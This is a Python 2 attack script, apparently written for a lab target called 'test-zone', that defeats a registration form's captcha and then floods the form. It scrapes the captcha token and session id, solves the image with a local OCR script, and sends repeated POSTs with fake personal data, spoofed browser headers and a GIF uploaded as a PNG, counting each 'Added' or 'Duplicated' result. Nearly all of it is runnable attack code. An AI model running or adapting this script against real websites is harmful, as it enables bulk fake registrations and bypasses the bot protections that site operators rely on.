import requests,sys, re,os,urllib, re
m = re.compile(r'<div id="captcha"><img src="/test-zone/php/create_captcha\.php\?_CAPTCHA&(?P<t>[^"]+)" alt="captcha"></div><input id="sesid" name="sessid" type="hidden" value="(?P<x>[a-h0-9]+)">')

url = "http://192.168.250.250/test-zone/php/form.php"
while 1:
	head = {
	'Host': '192.168.250.250',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
	'Accept': '*/*',
	'Accept-Language': 'en-US,en;q=0.5',
	'Referer': 'http://192.168.250.250/test-zone/register.html'
	}
	rx = requests.get("http://192.168.250.250/test-zone/register.html", headers=head)
	ix = m.search(rx.content).group('t')
	sessid = m.search(rx.content).group('x')
	cx = rx.cookies
	urlx = "http://192.168.250.250/test-zone/php/create_captcha.php?_CAPTCHA&" + ix
	# print url
	rx = requests.get(urlx,headers = head,cookies=cx)
	output = open("captcha.jpg","wb")
	output.write(rx.content)
	output.close()
	os.system("python main.py captcha.jpg")
	c = {'PHPSESSID':sessid}
	f=open("out.txt","r")
	captcha=f.read(5)
	f.close()
##
	#print "SESSID: ", sessid
	#print captcha
##
	urlcaptcha='http://192.168.250.250/test-zone/php/valid-captcha.php'
	payloadcaptcha = {'sessid': sessid, 'txtCaptcha': captcha}
	vali = requests.post(urlcaptcha, data=payloadcaptcha)
	#print vali.text
	if vali.text == 'right':
		print "SESSION ID:", sessid
		break
m = re.compile(r"alert\(\"(?P<a>[a-z A-Z!]+)\"\)")
#
#
file1 = open("screenshot.gif").read()
file2 = open("screenshot.gif").read()
files = {'file1': ('cmnd.png', file1, 'image/png'), 'file2': ('cmnd.png', file2, 'image/png')}
for i in range(int(sys.argv[2])):
        cmnd=sys.argv[1]
        data={  'hovaten':'kzy',
                'gioitinh':'Nam',
                'ngaysinh':'10/02/2017',
                'noisinh':'UIT',
                'dantoc':'Kinh',
                'tongiao':'Khong',
                'dienthoai':'0969700000',
                'cmnd':cmnd,
                'ngaycap':'10/02/2017',
                'noicap':'CA UIT',
                'sessid':sessid,
                'validate-captcha':captcha
        }
        r = requests.post(url, data=data,files=files,cookies=c)
        if "\u0047\u1eed\u0069" in r.text:
                print "ID:", i," -> Added"
        else:
                #print "CMND:", i," -> Loi:", m.search(r.text).group("a")
		print "ID", i, "-> Duplicated"
